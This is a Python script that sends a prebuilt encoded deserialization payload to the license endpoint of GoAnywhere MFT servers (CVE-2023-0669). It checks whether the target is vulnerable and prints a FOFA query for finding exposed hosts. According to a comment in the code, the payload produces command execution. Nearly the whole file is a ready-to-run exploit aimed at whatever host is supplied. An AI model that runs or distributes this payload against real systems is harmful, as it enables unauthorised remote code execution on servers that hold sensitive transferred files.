#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import argparse
import requests
import urllib3
import time
import json
import sys
import os
import re

from requests.packages.urllib3.exceptions import InsecureRequestWarning


def title():
    print('+          FOFA:title="GoAnywhere"')


def run_proto(url):
    con_list = ["/goanywhere/lic/accept"]
    for con in con_list:
        vuln_url = url + con
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        ''' 生成命令执行语句：
                        参考链接：https://github.com/trhacknon/CVE-2023-0669
        '''
        data = '''bundle=Jh88_jqGQWSbZmiCc1DErQhwOhCTLkYmA1yXgf86Ha5HF9IfVuQMLOfBS_fjlP7wTTEg2-Jx9nBDyFUKVTroXpFBt7zN1XDX58VKZCxCXlUD45d4laUUnNuzdyvNLT2b_gYKBi2-ny7fc2lOHNgalYV13mQzCTs0EgEUE9AuDUIMcFYx00pv4g4EOgEjeWbAx40rTtRby71AxapyXKy-4XChDHVlPB1AV3njBKGWT6gHdPxT8hb75Ycrpjdk9EQ1v4XlsWf2pcEuH1eHc_2CHlgeErjMGfXyXh9lNdrEoAOtw1UQOnhxT8clRjShGbSJSjIqgD8WyLRI0WsHnhdxBEgW8AluKnVsysck6loZL29Z9aaH-P4kvMzNqVmnIcvZ1_h3RLrtpSkbAbHXO0x0OpfU6f4T7xkoeMKt18mECpB1b_wIptrx4zYgHBYPwrmdjqyvCd_hfgIUWZ78QxN6-lffTHygs1TkMThebklF8vPAvqbye3LbxSo7BZ0NqSJpc8w4cdBYH2cYRVYBbiZvks_xiNTair_iGeK4RvzRnXhIwqwvY-5r0jf1Tb38rQY69pgKSwNFpPbkVJEUowSYIgldWMvTJo5I3ajtAeHHQKsClreyH0k86avvdtW4CpT-5GzUGCh3Ot5m35kFlJUPwkO2mIlGFGMmzjCi8SRurhahWTINnx1hyr_V8LrDNnf6IQ6mgnWdAJmN8F_vWvChrcUsFkHCzltO3B4IG3nLfqkc0N7aXkCfXO3ctiJDSv0u0XJdUkK9zzwyCK4--pd2GLV8bScMz0e4S13bOqHJGLNnPtJiX11M0nDYdLzPRZ3aAV68_rSpX9xdQCv8fBfLl28BK--rgaybRMYQRcGSkTx_k7p0zdNe1YXxAcxjxB2Sv89mw5khyg9PfeW_sy_m_r9SnxOrEawi7CloHE_fanD199CdC-oXQUPLLWhUd8GVdcsPV_jnZ_lKrefBfZyA3i3N97ohZ56Mnf3ehZj0k76_N_HxU_jpDKCMP_anmJdH2igjeARZYXkQJLfpvUEJAbTcOAKJXBmtz2o3tkbtqxSoW3cWjDd19zSzEixBZts4sVGFcgZU3Mr7o_6DC9gzGjTgxcTLo8ImU4ihJM4qpDAA5ItPnAxVkov2Jkmul-fKN1FQLavWqwm5rKFiVTrO70JrlE2Y_s5CP-X2oL8wrRUB09ewoO39HF59XXohw3GZGC3a9mqd7eJ35DuncGZPIow5HURuJSSbvSiAj3Vf77x3ZJUlhif21Y98Uoe6vf00cAuuZtND5OTv7gEHJ8JxagVXZTLc45mpbhursms-imI8Y4mFU5YxQ7D7K-0snOV9WKFLEC_CTf0IhbVYQumD_gtlfSz6zzVgZh1qE7vz6ILSiDAqoOCOhRVJr9LD9shL8fKddtAI9BRmLzp1hjU4LwkiA-O0dbpL6ZVUJfy4J2wrXTnD-N6uSw9l538GpLfX0kGEqZTz1vifJoeUjwZUTXVoRITmuOR72rvgDqHMgNmFMaDno-JUs5o7GW46xRyJQQZvgvY-nnhMkKQqExjbZJGV6kweJTC9v4kROfHCjAQ-O3VDfkeqFF_w2tNXhQuBgWQc9dvcKWcGv45yMP5c3HnF9ECeyeqfn_ciA_viyKYb7dXPDAqd1PW15q8s5R8G2BTfmtRaGeTsAqd6x3KyGt2Tz4cheUyyCi_kW8cuRDs7MWVmitoVBqHUGTla5M3_voOaVnlS0UaYhdTmpg5hYNJH27oOAhhAizgQpVhpvKOo2iQXKGoztiGvL1rEzO6uH7V_pZC4_mfEwt1AmIPW_AVDJjXaNqzFGoQll0Cz8D9de_Oxcjl8zsYm0KBgQKUxRipq8khF3Rj0GUSiDcvogKw9UEtJ2hy8dp9LCHnjaY2MxgWJN3J997wjlhSXMJayiAEDCI8hG953jMN5NL4a4OOVWdGN6zRWwANE9xqSJvMH-qBzCIDnuIBtIdZMu2WC9R7Of4xbCGns7UzoyfDhdZbb61radXf6qFb5qHcZ9QXJa6zJ09H7kEmcBTirdGR3BqxrtDm9bj4fg1cHbVeMBPqR8jS-nAJHTcHPuvLUc7Ey0s-H8jDY7auxDA0s7s4XG6X8_XDheZ0ZvjSMK8bnUFAt-HqM4DzaDKzG_bhwfD2-VKuYCbZ_2QcikqTtcbxu8wZJolokypO2ovgnpgijWGYi7Gf06UfzB22YOu6RwOF6dtAQ7DOshk2MUrxUyCKGE1XzLPoWAPYgiurez3Jk1th6IsjZvZuxLE9jSQPxNgBdmk_MlZsyfHp9K7S5vPUS8bd-uXeqmVjQbuwCxVOuOb6aPtZ8tfcTeA402dXLLc8SwPjdess0rBSKwknefKBIZCQzXsUEOC5znUDezr6prekysG3Exo2M9FjdW3B89qZJ1Dund2b8O2buXlUGNOZXk5rKZ_-C97k1zbNTA75DoZsQ0-JS323tM5oIWarbY2K9OIB190yNDOY5aPrkk34vZ7x7j05MUySnBRPhhD5zACcofTEDvo7BisNEDomJwrMjfb9qXE74CNybeu_ThkBA2oevjKdzfVTGfWTbjizvjoMDNFiM4qbqjD4jNbTo2L0lBFl3zSlbgNraw1Pa6NfKOG9aUbtaz5fXb7eakTpiwo9KiVtTB8CvFzvvmAwfLT3yp9sG7LUXbsQux3u0UeIIIOl_Bc8dH1mFL1ezp_80gRR20XsnzVUcHgq6OMQoGwcDVwe0MMJBn3RdJrUNkzNlkNGdss4wtYt4F-Kq51ho6q2rhoLuZizW-4c64-saBMj-QrdOS6wyW4PzEmA-z6yX1-Orljag32Jvh0JmCn_gDWIHltR05OuvDOCIIhYdfyZraROjFZO0vls0VES-7fvezBM6t5f6zDEEWL69mEq7ezCbdCuFjCSIuJ3Xre4nFjdKObd2MvXrNLSTm3dCCjCQg8wYrWDohRkuw6ClIsrCPMtZlQY-IbkHC4BWJXpmpUKMUGHd-9ByAUaKTntk3cV-qtEzzPRO0mThya22f9hPlKavJ1ZPs2zLJTpG5-3KkHqRdaM7bRRFpFER1jSAU9ehIIuabM6M-cfJGUXHEKG8U8mdZMkbYisHZ1E3QiR6iNzSRa5xzjTJ5Nr8p53i5Sn2QREAzAdx101sPQi4HNh61Wd3ENo31mRpUNbsd6ZCHLRor3z-APHLyRioDnDPniaTEeruboJFPz_ac4-NBDCTgWdtvdWpItaGB67Mexy2yUd8VjDs-kfmeJOgFeF87j8LjI1a6TfBJ4aPykUUDrQrnkf_cKZkIP09Kp3jvqdcsc0v7UIJrKTs0ooDEUDrlCdJFUVnmOiomThEGpWv2MupY1M1CLHrMAKXEZ1B0I8CbjBTzP5XHHmHTto_oehCrD92TyHWXZTlSmEGBqDQlc6r5vS1w4NoolYoiup-Cvm0Cs8Eqz0ib2fRQL-zTCbU62gGhQa_j7cO2ocvUc9jn7j77jx4gv274aHCiciTc3UOk9ER9IfbiBWAzPcQAK95tKS14TrHOz1tzV1nafu3uKX0_GnFiKqtgffG_Fqaib55PODMdxTHs9Dn-JDZ76hRNrCF31sYtsiP8aH2FLMCRDBxKteL6MDGyUoDkCmiFg8TOPbmuWDolAkmUTqoFWRE3TYlpi_YXyVLopApKG0zRXpUW_0SJdJ6KpJ2oSJOaKSu1RZD5XrXOlmFAok7QOVmDOYe'''
        try:
            session = requests.session()
            session.trust_env = False
            req = session.post(url=vuln_url, verify=False, data=data, headers=headers, timeout=(3, 3))
            if 'GoAnywhere' in req.text and req.status_code == 500:
                return True
            else:
                return False
        except Exception as e:
            return False
    return False


def run(target):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}'.format(proto[i], target)
        if run_proto(url):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    parse = argparse.ArgumentParser()
    parse.add_argument('-u', '--url', help='ip:port', default='127.0.0.1:8000')
    args = parse.parse_args()
    target = args.url
    result = run(target)

    if result:
        print('Exist')
    else:
        print('UnExist')
